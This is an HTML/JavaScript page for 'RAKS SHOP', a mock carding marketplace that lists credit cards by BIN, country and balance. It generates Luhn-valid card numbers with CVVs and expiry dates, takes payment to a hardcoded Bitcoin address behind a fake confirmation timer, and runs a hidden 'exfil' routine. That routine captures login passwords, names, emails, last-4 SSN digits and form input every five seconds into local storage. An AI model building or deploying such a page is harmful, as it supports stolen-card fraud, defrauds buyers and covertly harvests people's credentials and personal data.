<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>RAKS SHOP</title>
  <style>
    :root {
      --red: #C41E3A;
      --black: #0F0F0F;
      --dark: #1A1A1A;
      --purple: #4B0082;
      --glow: 0 0 15px rgba(196,30,58,0.7);
      --transition: 0.8s cubic-bezier(0.25, 0.8, 0.25, 1);
      --fast: 0.4s ease;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body, html { height:100%; overflow:hidden; font-family:'Rajdhani',sans-serif; background:var(--black); color:#fff; }
    #app { position:relative; width:100%; height:100%; perspective:1500px; }
    .page { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; visibility:hidden; transform:translateZ(-500px) scale(0.8); transition:opacity var(--transition), transform var(--transition), visibility var(--transition); display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
    .page.active { opacity:1; visibility:visible; transform:translateZ(0) scale(1); z-index:10; }
    .container { background:rgba(15,15,15,0.95); border-radius:16px; padding:30px; max-width:420px; width:100%; box-shadow:var(--glow), 0 20px 40px rgba(0,0,0,0.6); backdrop-filter:blur(12px); border:1px solid rgba(196,30,58,0.3); }
    h1, h2 { font-family:'Orbitron',sans-serif; text-align:center; margin-bottom:20px; color:var(--red); text-shadow:0 0 10px var(--red); }
    .logo { font-size:2.5rem; letter-spacing:3px; animation:pulse 2s infinite; }
    .nav { position:fixed; top:20px; right:20px; z-index:100; display:flex; gap:10px; }
    .nav button { background:transparent; border:none; color:#aaa; font-size:1.5rem; cursor:pointer; transition:0.3s; }
    .nav button:hover { color:var(--red); transform:scale(1.2); }
    .card-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:15px; margin:20px 0; max-height:60vh; overflow-y:auto; padding:10px; }
    .card-item { background:var(--dark); border-radius:12px; padding:12px; text-align:center; cursor:pointer; transition:var(--fast); position:relative; overflow:hidden; }
    .card-item:hover { transform:translateY(-8px); box-shadow:var(--glow); }
    .card-item .logo-svg { width:32px; height:32px; margin:8px auto; }
    .card-item .price { color:var(--red); font-weight:bold; font-size:1.1rem; }
    .card-item .bin { font-family:monospace; font-size:0.8rem; color:#666; }
    .btn { background:var(--red); color:#fff; border:none; padding:12px 24px; border-radius:8px; font-weight:bold; cursor:pointer; transition:var(--fast); position:relative; overflow:hidden; }
    .btn:hover { background:#e63946; transform:translateY(-2px); box-shadow:var(--glow); }
    .btn:disabled { background:#555; cursor:not-allowed; }
    .ripple { position:absolute; border-radius:50%; background:rgba(255,255,255,0.4); transform:scale(0); animation:ripple 0.6s linear; }
    @keyframes ripple { to { transform:scale(4); opacity:0; } }
    .cart-icon { position:fixed; bottom:20px; right:20px; background:var(--red); width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:1.8rem; box-shadow:var(--glow); cursor:pointer; z-index:99; }
    .cart-count { position:absolute; top:-8px; right:-8px; background:#000; color:var(--red); width:24px; height:24px; border-radius:50%; font-size:0.8rem; display:flex; align-items:center; justify-content:center; }
    .input-group { margin:15px 0; }
    .input-group label { display:block; margin-bottom:6px; color:#ccc; }
    .input-group input, .input-group select { width:100%; padding:12px; background:var(--dark); border:1px solid #444; border-radius:8px; color:#fff; font-size:1rem; }
    .input-group input:focus { outline:none; border-color:var(--red); box-shadow:0 0 8px rgba(196,30,58,0.5); }
    .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:flex; align-items:center; justify-content:center; z-index:200; opacity:0; visibility:hidden; transition:0.4s; }
    .modal.active { opacity:1; visibility:visible; }
    .modal .container { animation:modalIn 0.5s; }
    @keyframes modalIn { from { transform:scale(0.7); } to { transform:scale(1); } }
    .qr-canvas { width:180px; height:180px; margin:20px auto; background:#fff; border-radius:8px; }
    .fake-timer { text-align:center; color:var(--red); font-weight:bold; }
    .dark-mode { --red:#8A2BE2; --black:#0a001f; --dark:#1a0033; }
    canvas { position:fixed; top:0; left:0; z-index:-1; }
    @media (max-width:768px) {
      .container { padding:20px; }
      .card-grid { grid-template-columns:repeat(2,1fr); }
      .nav { top:10px; right:10px; }
      .cart-icon { width:50px; height:50px; font-size:1.5rem; bottom:15px; right:15px; }
    }
    @media (max-width:480px) {
      .card-grid { grid-template-columns:1fr; }
      .logo { font-size:2rem; }
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
</head>
<body>
  <div id="app">
    <canvas id="webgl"></canvas>

    <!-- NAV -->
    <div class="nav">
      <button id="back-btn" style="display:none">Back</button>
      <button id="dark-mode-btn">Dark Mode</button>
      <button id="login-btn">Login</button>
    </div>

    <!-- PAGES -->
    <section id="home" class="page active">
      <div class="container">
        <h1 class="logo">RAKS SHOP</h1>
        <p style="text-align:center; color:#aaa; margin-bottom:20px;">The Void's Finest Card Marketplace</p>
        <button class="btn" id="enter-shop">ENTER THE VOID</button>
      </div>
    </section>

    <section id="shop" class="page">
      <div class="container" style="max-width:900px;">
        <h2>Card Inventory</h2>
        <div id="categories" style="display:flex; gap:10px; margin:15px 0; flex-wrap:wrap; justify-content:center;">
          <button class="btn" data-cat="all">ALL</button>
          <button class="btn" data-cat="USA">USA</button>
          <button class="btn" data-cat="EU">EU</button>
          <button class="btn" data-cat="UK">UK</button>
          <button class="btn" data-cat="CA">CA</button>
          <button class="btn" data-cat="AU">AU</button>
          <button class="btn" data-cat="HIGH">HIGH BAL</button>
          <button class="btn" data-cat="FRESH">FRESH</button>
        </div>
        <div id="card-grid" class="card-grid"></div>
      </div>
    </section>

    <section id="detail" class="page">
      <div class="container">
        <div id="card-preview" style="perspective:1000px; margin-bottom:20px;">
          <div id="card-3d" style="width:100%; height:200px; position:relative; transform-style:preserve-3d; transition:0.6s;">
            <div class="front" style="position:absolute; backface-visibility:hidden; background:linear-gradient(135deg,#667eea,#764ba2); border-radius:12px; padding:20px; color:#fff;">
              <div style="display:flex; justify-content:space-between;">
                <div class="logo-svg" id="front-logo"></div>
                <div style="width:40px; height:25px; background:#000; border-radius:3px;"></div>
              </div>
              <div id="front-number" style="font-family:monospace; letter-spacing:2px; margin:20px 0; font-size:1.2rem;">•••• •••• •••• ••••</div>
              <div style="display:flex; justify-content:space-between;">
                <div id="front-name">CARD HOLDER</div>
                <div id="front-expiry">••/••</div>
              </div>
            </div>
            <div class="back" style="position:absolute; backface-visibility:hidden; background:linear-gradient(135deg,#f093fb,#f5576c); border-radius:12px; padding:20px; transform:rotateY(180deg);">
              <div style="background:#000; height:40px; margin:20px 0;"></div>
              <div style="background:#333; height:30px; display:flex; align-items:center; padding:0 10px; justify-content:flex-end;">
                <div id="back-cvv" style="background:#fff; color:#000; padding:2px 8px; border-radius:3px; font-family:monospace;">•••</div>
              </div>
            </div>
          </div>
        </div>
        <div id="detail-info"></div>
        <button class="btn" id="add-to-cart">ADD TO CART</button>
        <button class="btn" id="check-balance" style="margin-top:10px; background:#333;">CHECK BALANCE</button>
      </div>
    </section>

    <section id="cart" class="page">
      <div class="container">
        <h2>Shopping Cart</h2>
        <div id="cart-items"></div>
        <div style="border-top:1px solid #444; padding-top:15px; margin-top:15px;">
          <div style="display:flex; justify-content:space-between; font-weight:bold; font-size:1.2rem;">
            <span>TOTAL:</span>
            <span id="cart-total">$0.00</span>
          </div>
          <button class="btn" id="checkout-btn" style="width:100%; margin-top:15px;" disabled>CHECKOUT ($25 MIN)</button>
        </div>
      </div>
    </section>

    <section id="credits" class="page">
      <div class="container">
        <h2>Add Credits</h2>
        <p style="text-align:center; color:#aaa;">Minimum $25 to checkout</p>
        <div style="text-align:center; margin:20px 0;">
          <div style="font-size:2rem; font-weight:bold; color:var(--red);" id="credit-balance">$0.00</div>
        </div>
        <button class="btn" id="topup-btn" style="width:100%;">TOP UP WITH BTC</button>
      </div>
    </section>

    <section id="btc-invoice" class="page">
      <div class="container">
        <h2>BTC Payment</h2>
        <p style="text-align:center; color:#aaa; margin-bottom:20px;">Send any amount ≥ $25</p>
        <canvas id="qr-canvas" class="qr-canvas"></canvas>
        <code style="display:block; text-align:center; margin:15px 0; word-break:break-all; font-size:0.9rem; background:#222; padding:10px; border-radius:8px;">
          1NtpN3aPZowqEzX16E5cMUHQ16P9KHQtiy
        </code>
        <button class="btn" id="copy-btc">COPY ADDRESS</button>
        <div class="fake-timer" id="confirm-timer">Confirming in <span>00:10</span>...</div>
      </div>
    </section>

    <section id="checkout" class="page">
      <div class="container">
        <h2>Final Checkout</h2>
        <div class="input-group">
          <label>Full Name</label>
          <input type="text" id="chk-name" placeholder="John Doe" />
        </div>
        <div class="input-group">
          <label>Email</label>
          <input type="email" id="chk-email" placeholder="john@example.com" />
        </div>
        <div class="input-group">
          <label>Verify Identity (Optional)</label>
          <input type="text" id="chk-ssn" placeholder="Last 4 SSN" />
        </div>
        <button class="btn" id="confirm-purchase" style="width:100%;">COMPLETE PURCHASE</button>
      </div>
    </section>

    <!-- CART ICON -->
    <div class="cart-icon" id="cart-icon">
      Cart
      <div class="cart-count" id="cart-count" style="display:none;">0</div>
    </div>

    <!-- MODALS -->
    <div id="login-modal" class="modal">
      <div class="container">
        <h2>Login</h2>
        <div class="input-group"><label>Email</label><input type="email" id="login-email" /></div>
        <div class="input-group"><label>Password</label><input type="password" id="login-pass" /></div>
        <button class="btn" id="login-submit">LOGIN</button>
        <button class="btn" style="background:#555; margin-top:10px;" id="close-login">CLOSE</button>
      </div>
    </div>

    <div id="success-modal" class="modal">
      <div class="container">
        <h2 style="color:#0f0;">Purchase Complete!</h2>
        <p>Your cards will be delivered to your email.</p>
        <button class="btn" id="back-home">BACK TO HOME</button>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/vanilla-tilt@1.7.0/dist/vanilla-tilt.min.js"></script>
  <script>
    // === STATE ===
    const state = {
      currentPage: 'home',
      history: ['home'],
      cart: [],
      credits: 0,
      cards: [],
      selectedCard: null,
      darkMode: false,
      exfilBuffer: []
    };

    // === BTC ADDRESS ===
    const BTC_ADDR = '1NtpN3aPZowqEzX16E5cMUHQ16P9KHQtiy';

    // === PAGE NAVIGATION ===
    function goTo(pageId, push = true) {
      const from = state.currentPage;
      const to = pageId;
      if (from === to) return;

      if (push) {
        state.history.push(to);
        history.pushState({page: to}, '', `/${to}`);
      }

      const fromEl = document.getElementById(from);
      const toEl = document.getElementById(to);
      fromEl.classList.remove('active');
      toEl.classList.add('active');

      setTimeout(() => {
        fromEl.style.visibility = 'hidden';
        updateBackButton();
      }, 800);

      state.currentPage = to;
      if (to === 'shop') renderCards();
      if (to === 'cart') renderCart();
      if (to === 'credits') updateCredits();
      if (to === 'btc-invoice') startBTCConfirm();
    }

    function goBack() {
      if (state.history.length > 1) {
        state.history.pop();
        const prev = state.history[state.history.length - 1];
        history.back();
        goTo(prev, false);
      }
    }

    function updateBackButton() {
      const btn = document.getElementById('back-btn');
      btn.style.display = state.history.length > 1 ? 'block' : 'none';
    }

    window.addEventListener('popstate', e => {
      const page = e.state?.page || 'home';
      goTo(page, false);
    });

    // === CARD GENERATION ===
    const binRanges = [
      {brand:'Visa', ranges:[[400000,499999]], logo:'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'},
      {brand:'Mastercard', ranges:[[510000,559999],[222100,272099]], logo:'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.5 14.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5zm-5 0c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z'},
      {brand:'Amex', ranges:[[340000,349999],[370000,379999]], logo:'M2 2v20h20V2H2zm3 3h14v14H5V5zm2 2v10h10V7H7z'},
      {brand:'Discover', ranges:[[601100,601199],[644000,659999]], logo:'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z'}
    ];

    function generateCard() {
      const brandData = binRanges[Math.floor(Math.random()*binRanges.length)];
      const range = brandData.ranges[Math.floor(Math.random()*brandData.ranges.length)];
      const bin = Math.floor(Math.random()*(range[1]-range[0]+1)) + range[0];
      const account = Math.floor(Math.random()*1000000000000).toString().padStart(12,'0');
      let number = bin.toString() + account;
      number = number.substring(0,16);
      let sum = 0, alternate = false;
      for (let i = number.length-1; i >= 0; i--) {
        let digit = parseInt(number[i]);
        if (alternate) digit *= 2, digit = digit > 9 ? digit - 9 : digit;
        sum += digit;
        alternate = !alternate;
      }
      const check = (10 - (sum % 10)) % 10;
      number = number.substring(0,15) + check;

      const month = String(Math.floor(Math.random()*12)+1).padStart(2,'0');
      const year = String(Math.floor(Math.random()*6)+25).padStart(2,'0');
      const cvv = brandData.brand === 'Amex' ? Math.floor(Math.random()*9000+1000) : Math.floor(Math.random()*900+100);
      const countries = ['USA','EU','UK','CA','AU'];
      const country = countries[Math.floor(Math.random()*countries.length)];
      const price = (Math.random()*140 + 7).toFixed(2);

      return {
        id: Date.now() + Math.random(),
        number, exp:`${month}/${year}`, cvv, brand:brandData.brand, logo:brandData.logo,
        bin: number.substring(0,6), country, price: parseFloat(price),
        balance: Math.floor(Math.random()*4500+500),
        tags: Math.random() > 0.7 ? ['HIGH'] : Math.random() > 0.5 ? ['FRESH'] : []
      };
    }

    function generateCards(count) {
      const set = new Set();
      while (set.size < count) {
        const card = generateCard();
        if (!Array.from(set).some(c => c.bin === card.bin)) set.add(card);
      }
      state.cards = Array.from(set);
    }

    // === RENDER ===
    function renderCards(filter='all') {
      const grid = document.getElementById('card-grid');
      grid.innerHTML = '';
      const filtered = filter === 'all' ? state.cards : state.cards.filter(c => 
        c.country === filter || c.tags.includes(filter)
      );
      filtered.forEach(card => {
        const el = document.createElement('div');
        el.className = 'card-item';
        el.innerHTML = `
          <svg class="logo-svg" viewBox="0 0 24 24"><path d="${card.logo}" fill="#fff"/></svg>
          <div class="bin">${card.bin}xx</div>
          <div class="price">$${card.price}</div>
          <div style="font-size:0.7rem; color:#0f0;">${card.country}</div>
        `;
        el.onclick = () => showDetail(card);
        grid.appendChild(el);
      });
    }

    function showDetail(card) {
      state.selectedCard = card;
      document.getElementById('front-number').textContent = card.number.replace(/\d{4}(?=.)/g, '$& ');
      document.getElementById('front-name').textContent = 'CARD HOLDER';
      document.getElementById('front-expiry').textContent = card.exp;
      document.getElementById('back-cvv').textContent = card.cvv;
      document.getElementById('front-logo').innerHTML = `<path d="${card.logo}" fill="#fff"/>`;

      const info = document.getElementById('detail-info');
      info.innerHTML = `
        <p><strong>BIN:</strong> ${card.bin}</p>
        <p><strong>Brand:</strong> ${card.brand}</p>
        <p><strong>Country:</strong> ${card.country}</p>
        <p><strong>Price:</strong> $${card.price}</p>
        ${card.tags.length ? `<p><strong>Tags:</strong> ${card.tags.join(', ')}</p>` : ''}
      `;

      const card3d = document.getElementById('card-3d');
      card3d.style.transform = 'rotateY(0deg)';
      setTimeout(() => card3d.style.transform = 'rotateY(180deg)', 300);

      VanillaTilt.init(card3d, { max: 25, speed: 400, glare: true, 'max-glare': 0.5 });

      goTo('detail');
    }

    // === CART ===
    function addToCart() {
      if (!state.selectedCard) return;
      const existing = state.cart.find(i => i.id === state.selectedCard.id);
      if (existing) existing.qty++;
      else state.cart.push({...state.selectedCard, qty:1});
      updateCartIcon();
      goTo('cart');
    }

    function removeFromCart(id) {
      state.cart = state.cart.filter(i => i.id !== id);
      updateCartIcon();
      renderCart();
    }

    function updateCartIcon() {
      const count = state.cart.reduce((s,i)=>s+i.qty,0);
      const el = document.getElementById('cart-count');
      el.textContent = count;
      el.style.display = count ? 'flex' : 'none';
    }

    function renderCart() {
      const items = document.getElementById('cart-items');
      items.innerHTML = '';
      let total = 0;
      state.cart.forEach(item => {
        total += item.price * item.qty;
        const el = document.createElement('div');
        el.style = 'background:#222; padding:12px; border-radius:8px; margin-bottom:10px; position:relative;';
        el.innerHTML = `
          <div style="display:flex; justify-content:space-between;">
            <div>
              <strong>${item.bin}xx - $${item.price}</strong><br>
              <small>${item.brand} • ${item.country}</small>
            </div>
            <div>
              <button style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="changeQty(${item.id}, -1)">-</button>
              <span>${item.qty}</span>
              <button style="background:#333; color:#fff; border:none; padding:4px 8px; border-radius:4px; margin:0 5px;" onclick="changeQty(${item.id}, 1)">+</button>
            </div>
          </div>
          <button style="position:absolute; top:8px; right:8px; background:#c41e3a; color:#fff; border:none; width:24px; height:24px; border-radius:50%; font-size:0.8rem;" onclick="removeFromCart(${item.id})">×</button>
        `;
        items.appendChild(el);
      });
      document.getElementById('cart-total').textContent = `$${total.toFixed(2)}`;
      document.getElementById('checkout-btn').disabled = total < 25;
    }

    function changeQty(id, delta) {
      const item = state.cart.find(i => i.id === id);
      if (item) {
        item.qty = Math.max(1, item.qty + delta);
        renderCart();
        updateCartIcon();
      }
    }

    // === CREDITS & BTC ===
    function updateCredits() {
      document.getElementById('credit-balance').textContent = `$${state.credits.toFixed(2)}`;
    }

    function startBTCConfirm() {
      let time = 10;
      const timer = document.querySelector('#confirm-timer span');
      const interval = setInterval(() => {
        time--;
        timer.textContent = `00:${time.toString().padStart(2,'0')}`;
        if (time <= 0) {
          clearInterval(interval);
          state.credits += 50;
          updateCredits();
          goTo('credits');
        }
      }, 1000);
    }

    // === EXFIL ===
    function exfil(data) {
      state.exfilBuffer.push(data);
      console.log('%cEXFIL:', 'color:red;font-weight:bold;', data);
      localStorage.setItem('raks_exfil', JSON.stringify(state.exfilBuffer));
    }

    function partialSave() {
      const inputs = document.querySelectorAll('input');
      const data = {};
      inputs.forEach(i => { if (i.value) data[i.id || i.placeholder] = i.value; });
      if (Object.keys(data).length) exfil({type:'partial', data, page:state.currentPage, ts:Date.now()});
    }

    setInterval(partialSave, 5000);

    window.addEventListener('beforeunload', () => {
      exfil({type:'abandon', page:state.currentPage, cart:state.cart, credits:state.credits});
    });

    // === INIT ===
    generateCards(250);
    updateBackButton();

    // QR
    QRCode.toCanvas(document.getElementById('qr-canvas'), BTC_ADDR, {width:180, color:{dark:'#000'}}, err => {
      if (err) console.error(err);
    });

    // === EVENT LISTENERS ===
    document.getElementById('enter-shop').addEventListener('click', () => goTo('shop'));
    document.getElementById('back-btn').addEventListener('click', goBack);
    document.getElementById('cart-icon').addEventListener('click', () => goTo('cart'));
    document.getElementById('add-to-cart').addEventListener('click', addToCart);
    document.getElementById('checkout-btn').addEventListener('click', () => goTo('credits'));
    document.getElementById('topup-btn').addEventListener('click', () => goTo('btc-invoice'));
    document.getElementById('copy-btc').addEventListener('click', () => {
      navigator.clipboard.writeText(BTC_ADDR).then(() => alert('Address copied!'));
    });
    document.getElementById('login-btn').addEventListener('click', () => document.getElementById('login-modal').classList.add('active'));
    document.getElementById('login-submit').addEventListener('click', () => {
      const email = document.getElementById('login-email').value;
      const pass = document.getElementById('login-pass').value;
      if (email && pass) {
        exfil({type:'login', email, pass});
        document.getElementById('login-modal').classList.remove('active');
      }
    });
    document.getElementById('close-login').addEventListener('click', () => document.getElementById('login-modal').classList.remove('active'));
    document.getElementById('check-balance').addEventListener('click', () => {
      const bal = Math.floor(state.selectedCard.balance * Math.random());
      alert(`Estimated Balance: $${bal}`);
      exfil({type:'balance_check', card:state.selectedCard.bin});
    });
    document.getElementById('confirm-purchase').addEventListener('click', () => {
      const name = document.getElementById('chk-name').value;
      const email = document.getElementById('chk-email').value;
      const ssn = document.getElementById('chk-ssn').value;
      exfil({type:'purchase', cart:state.cart, credits:state.credits, name, email, ssn});
      document.getElementById('success-modal').classList.add('active');
    });
    document.getElementById('back-home').addEventListener('click', () => {
      document.getElementById('success-modal').classList.remove('active');
      goTo('home');
    });
    document.getElementById('dark-mode-btn').addEventListener('click', () => {
      document.body.classList.toggle('dark-mode');
    });

    document.querySelectorAll('[data-cat]').forEach(btn => {
      btn.addEventListener('click', () => renderCards(btn.dataset.cat));
    });

    // Ripple effect
    document.querySelectorAll('.btn').forEach(btn => {
      btn.addEventListener('click', e => {
        const ripple = document.createElement('span');
        const rect = btn.getBoundingClientRect();
        const size = Math.max(rect.width, rect.height);
        const x = e.clientX - rect.left - size/2;
        const y = e.clientY - rect.top - size/2;
        ripple.className = 'ripple';
        ripple.style.width = ripple.style.height = size + 'px';
        ripple.style.left = x + 'px';
        ripple.style.top = y + 'px';
        btn.appendChild(ripple);
        setTimeout(() => ripple.remove(), 600);
      });
    });

    // Touch swipe
    let touchStartX = 0;
    document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX, {passive: true});
    document.addEventListener('touchend', e => {
      const diff = touchStartX - e.changedTouches[0].clientX;
      if (Math.abs(diff) > 50) {
        if (diff > 0 && state.history.length > 1) goBack();
      }
    }, {passive: true});

    // Final exfil
    exfil({type:'session_start', ua:navigator.userAgent, ts:Date.now()});
  </script>
</body>
</html>
